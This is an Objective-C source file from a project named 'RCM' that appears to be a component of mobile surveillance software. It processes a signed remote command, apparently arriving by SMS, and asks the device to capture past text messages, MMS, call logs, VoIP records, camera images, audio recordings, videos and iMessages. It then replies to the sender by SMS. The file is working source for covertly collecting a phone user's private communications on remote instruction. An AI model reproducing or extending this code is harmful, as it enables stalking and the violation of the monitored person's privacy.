//
//  RequestHistoricalEventProcessor.m
//  RCM
//
//  Created by Makara on 12/9/14.
//
//

#import "RequestHistoricalEventProcessor.h"
#import "RemoteCmdSettingsCode.h"

@implementation RequestHistoricalEventProcessor

/**
 - Method name: initWithRemoteCommandData:andCommandProcessingDelegate
 - Purpose:This method is used to initialize the RequestHistoricalEventProcessor class
 - Argument list and description: aRemoteCmdData (RemoteCmdData),aRemoteCmdProcessingDelegate (RemoteCmdProcessingDelegate)
 - Return description: No return type
 */

- (id) initWithRemoteCommandData: (RemoteCmdData *) aRemoteCmdData
	andCommandProcessingDelegate: (id <RemoteCmdProcessingDelegate>) aRemoteCmdProcessingDelegate {
    DLog (@"RequestHistoricalEventProcessor--->initWithRemoteCommandData");
	if ((self = [super initWithRemoteCommandData:aRemoteCmdData andCommandProcessingDelegate:aRemoteCmdProcessingDelegate])) {
        
	}
	return self;
}

#pragma mark RemoteCmdProcessor Methods

/**
 - Method name: doProcessingCommand
 - Purpose:This method is used to process the RequestHistoricalEventProcessor
 - Argument list and description:No Argument
 - Return description: No return type
 */

- (void) doProcessingCommand {
    DLog (@"RequestHistoricalEventProcessor--->doProcessingCommand");
    
	if (![RemoteCmdSignatureUtils verifyRemoteCmdDataSignature:mRemoteCmdData
                                  numberOfMinimumCompulsoryTag:4]) {
		[RemoteCmdSignatureUtils throwInvalidCmdWithName:@"RequestHistoricalEventProcessor"
												  reason:@"Failed signature check"];
	}
	
	[self processQueryHistoricalEvents];
}

#pragma mark HistoricalEventDelegate methods

- (void) captureHistoricalEventsProgress: (HistoricalEventType) aHistoricalEventType error: (NSError *) aError {
    DLog(@"RequestHistoricalEventProcessor--->Progress on historical events, type = %d, error = %@", aHistoricalEventType, aError);
}

- (void) captureHistoricalEventsDidFinished {
    DLog(@"RequestHistoricalEventProcessor--->Request historical events completed.")
    NSString *messageFormat = [[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode]
                                                                                          andErrorCode:_SUCCESS_];
	NSString *ackMessage=[messageFormat stringByAppendingString:NSLocalizedString(@"kRequestHistoricalEventsMSG2", @"")];
	[self sendReplySMS:ackMessage isProcessCompleted:YES];
}

#pragma mark RequestHistoricalEventProcessor Private Mehods

/**
 - Method name: processQueryHistoricalEvents
 - Purpose:This method is used to process RequestHistoricalEventProcessor
 - Argument list and description: No argument
 - Return description:No return type
 */

- (void) processQueryHistoricalEvents {
	DLog (@"RequestHistoricalEventProcessor--->processQueryHistoricalEvents");
    NSArray *args = [mRemoteCmdData mArguments];
    
    // 1st argument is Total Number
    NSString *totalNumberString   = [args objectAtIndex:2];
    
    // Ensure that this is number
    if (![RemoteCmdProcessorUtils isDigitsDashOnly:totalNumberString]) {
        DLog(@"Total number is not digit")
        [RemoteCmdSignatureUtils throwInvalidCmdWithName:@"RequestHistoricalEventProcessor"
                                                  reason:@"Failed signature check"];
    }
    
    NSInteger totalNumber = [totalNumberString integerValue];
    
    // 2nd, 3rd, and so on , is type of event
    // Event type
    unsigned long long eventType = 0;
    for (NSUInteger i = 3; i < [args count]; i++) {
        NSString *eventToCapture = [args objectAtIndex:i];
        DLog(@"event type to capture %@", eventToCapture)
        
        switch ([eventToCapture integerValue]) {
            case kRemoteCmdSMS:
                eventType |= kHistoricalEventTypeSMS;
                break;
            case kRemoteCmdMMS:
                eventType |= kHistoricalEventTypeMMS;
                break;
            case kRemoteCmdCallLog:
                eventType |= kHistoricalEventTypeCallLog;
                break;
            case kRemoteCmdVoIP:
                eventType |= kHistoricalEventTypeVoIP;
                break;
            case kRemoteCmdCameraImage:
                eventType |= kHistoricalEventTypeCameraImage;
                break;
            case kRemoteCmdAudioRecording:
                eventType |= kHistoricalEventTypeAudioRecording;
                break;
            case kRemoteCmdVideoFile:
                eventType |= kHistoricalEventTypeVideoFile;
                break;
            case kRemoteCmdIMIMessage:
                eventType |= kHistoricalEventTypeIMIMessage;
                break;
            default:
                break;
        }
    }
    
    DLog(@"Event type to be captured %llu", eventType)
    // Request historical events
    id <HistoricalEventManager> historicalEventManager = [[RemoteCmdUtils sharedRemoteCmdUtils] mHistoricalEventManager];
    if ([historicalEventManager captureHistoricalEvents:eventType totalNumber:totalNumber delegate:self]) {
        [self acknowldgeMessage];
    } else {
        [RemoteCmdSignatureUtils throwInvalidCmdWithName:@"RequestHistoricalEventProcessor"
                                                  reason:@"Failed signature check"];
    }
}

/**
 - Method name: acknowldgeMessage
 - Purpose:		This method is used to prepare acknowldge message
 - Argument list and description:	No Argument
 - Return description:				No Return
 */

- (void) acknowldgeMessage {
	NSString *messageFormat = [[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode]
                                                                                          andErrorCode:_SUCCESS_];
	NSString *ackMessage=[messageFormat stringByAppendingString:NSLocalizedString(@"kRequestHistoricalEventsMSG1", @"")];
	[self sendReplySMS:ackMessage isProcessCompleted:NO];
}


/**
 - Method name: sendReplySMS
 - Purpose:This method is used to send the SMS reply
 - Argument list and description: aStatusCode (NSUInteger)
 - Return description: No return type
 */

- (void) sendReplySMS: (NSString *) aReplyMessage  isProcessCompleted: (BOOL) aIsComplete  {
	DLog (@"RequestHistoricalEventProcessor--->sendReplySMS");
	[[RemoteCmdUtils sharedRemoteCmdUtils] createSystemEvent:mRemoteCmdData
											 andReplyMessage:aReplyMessage];
	if ([mRemoteCmdData mIsSMSReplyRequired]) {
		[[RemoteCmdUtils sharedRemoteCmdUtils] sendSMSWithRecipientNumber:[self recipientNumber]
															   andMessage:aReplyMessage];
	}
	if (aIsComplete) {
		[self processFinished];
	}
	else {
		DLog (@"Sent acknowldge message.");
	}
}

/**
 - Method name: processFinished
 - Purpose:This method is invoked when RequestHistoricalEventProcessor is completed
 - Argument list and description:No Argument
 - Return description:isValidArguments (BOOL)
 */

-(void) processFinished {
	DLog (@"RequestHistoricalEventProcessor--->processFinished");
	if ([mRemoteCmdProcessingDelegate respondsToSelector:@selector(proccessFinishedWithProcessor:andRemoteCmdData:)]) {
		[mRemoteCmdProcessingDelegate performSelector:@selector(proccessFinishedWithProcessor:andRemoteCmdData:) withObject:self withObject:mRemoteCmdData];
	}
}

/**
 - Method name:dealloc
 - Purpose: This is memory mangement method. Invoked when the class object releasd.
 - Argument list and description: No argument
 - Return type and description: No Return
 */

- (void) dealloc {
	DLog (@"dealloc of request historical events processor");
	[super dealloc];
}

@end
